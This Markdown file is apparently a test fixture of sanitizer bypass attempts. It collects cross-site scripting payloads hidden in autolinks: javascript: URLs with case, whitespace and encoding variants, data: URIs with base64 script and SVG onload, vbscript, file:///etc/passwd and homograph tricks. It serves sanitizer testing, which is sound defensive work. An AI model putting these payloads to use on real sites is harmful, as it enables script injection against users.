# Sanitizer Logic Bypass Attempts

## Autolink that creates valid URL but dangerous content
<https://example.com/![test](https://attacker.com/malicious.js)>

## Autolink that bypasses normalization through valid URL structure
<https://trusted.com/redirect?to=![evil](javascript:alert('redirect'))>

## Autolink that exploits URL normalization edge cases
<https://example.com:443/![test](javascript:alert('port-norm'))>

## Autolink that creates reference-style image after normalization
<https://example.com/path>[ref]

[ref]: javascript:alert('ref-after-norm')

## Autolink that exploits character encoding after URL validation
<https://example.com/![test](data:text/html;charset=utf-7,+ADw-script+AD4-alert('utf7')+ADw-/script+AD4-)>

## Autolink that bypasses through valid data URI
<https://example.com/![test](data:image/svg+xml,<svg onload="alert('svg')"/>)>

## Autolink that exploits base64 padding variations
<https://example.com/![test](data:text/html;base64,PHNjcmlwdD5hbGVydCgnYmFzZTY0Jyk8L3NjcmlwdD4)>
<https://example.com/![test](data:text/html;base64,PHNjcmlwdD5hbGVydCgnYmFzZTY0Jyk8L3NjcmlwdD4=)>
<https://example.com/![test](data:text/html;base64,PHNjcmlwdD5hbGVydCgnYmFzZTY0Jyk8L3NjcmlwdD4==)>

## Autolink that exploits MIME type variations
<https://example.com/![test](data:text/HTML,<script>alert('mime')</script>)>
<https://example.com/![test](data:TEXT/html,<script>alert('mime-case')</script>)>

## Autolink that bypasses through javascript URL with whitespace
<https://example.com/![test](javascript: alert('js-space'))>
<https://example.com/![test](javascript:	alert('js-tab'))>
<https://example.com/![test](javascript:
alert('js-newline'))>

## Autolink that exploits vbscript protocol
<https://example.com/![test](vbscript:msgbox("vbs"))>

## Autolink that exploits about protocol
<https://example.com/![test](about:blank#blocked)>

## Autolink that exploits chrome protocol
<https://example.com/![test](chrome://settings/)>

## Autolink that exploits file protocol
<https://example.com/![test](file:///etc/passwd)>

## Autolink that exploits FTP with credentials
<https://example.com/![test](ftp://user:pass@ftp.example.com/file.txt)>

## Autolink that bypasses through URL with no authority
<https://example.com/![test](javascript:alert('no-auth'))>

## Autolink that exploits URL with empty authority
<https://example.com/![test](javascript:///alert('empty-auth'))>

## Autolink that bypasses through protocol case variations
<https://example.com/![test](JavaScript:alert('js-case'))>
<https://example.com/![test](JAVASCRIPT:alert('js-upper'))>

## Autolink that exploits mixed case in data URI
<https://example.com/![test](Data:text/html,<script>alert('data-case')</script>)>

## Autolink that bypasses through URL fragment manipulation
<https://example.com/safe#![test](javascript:alert('fragment-bypass'))>

## Autolink that exploits URL query parameter manipulation
<https://example.com/safe?param=![test](javascript:alert('query-bypass'))>

## Autolink that bypasses through path manipulation
<https://example.com/safe/../![test](javascript:alert('path-bypass'))>

## Autolink that exploits URL normalization timing
<https://example.com/![test](JavaScript%3AAlert%28%27timing%27%29)>

## Autolink that bypasses through valid HTTPS but dangerous content
<https://trusted-cdn.com/![test](data:application/javascript,alert('trusted-bypass'))>

## Autolink that exploits blob URL
<https://example.com/![test](blob:https://example.com/uuid-here)>

## Autolink that exploits filesystem URL
<https://example.com/![test](filesystem:https://example.com/temporary/file)>

## Autolink that bypasses through websocket URL
<https://example.com/![test](ws://example.com/socket)>
<https://example.com/![test](wss://example.com/secure-socket)>

## Autolink that exploits nested URL encoding
<https://example.com/![test](javascript%253Aalert%2528%2527nested%2527%2529)>

## Autolink that bypasses through Unicode normalization
<https://example.com/![test](javascrｉpt:alert('unicode-i'))>

## Autolink that exploits IDN homograph attack
<https://еxample.com/![test](javascript:alert('homograph'))>

## Autolink that bypasses through punycode
<https://xn--e1afmkfd.xn--p1ai/![test](javascript:alert('punycode-bypass'))>

## Autolink that exploits IP address representations
<https://127.0.0.1/![test](javascript:alert('localhost'))>
<https://[::1]/![test](javascript:alert('ipv6-localhost'))>
<https://2130706433/![test](javascript:alert('decimal-ip'))>

## Autolink that bypasses through authority section manipulation  
<https://user:pass@example.com/![test](javascript:alert('auth-bypass'))>

## Autolink that exploits port number edge cases
<https://example.com:443/![test](javascript:alert('default-port'))>
<https://example.com:80/![test](javascript:alert('wrong-default-port'))>

## Autolink that bypasses through scheme-relative URL
<https://example.com//attacker.com/![test](javascript:alert('scheme-relative'))>

## Autolink that exploits URL parsing differences between libraries
<https://example.com/![test](java\script:alert('backslash-protocol'))>

## Autolink that bypasses through malformed URL recovery
<https://example.com/![test](javascript:alert('malformed'))extra>

## Autolink that exploits URL length limitations
<https://example.com/verylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpathverylongpath/![test](javascript:alert('long-url'))>

## Autolink that exploits character set confusion
<https://example.com/![test](javascript:alert('charset'))>

## Autolink that bypasses through content-type spoofing
<https://example.com/![test](data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)>

## Autolink that exploits SVG with JavaScript
<https://example.com/![test](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ3N2ZycpPC9zY3JpcHQ+PC9zdmc+)>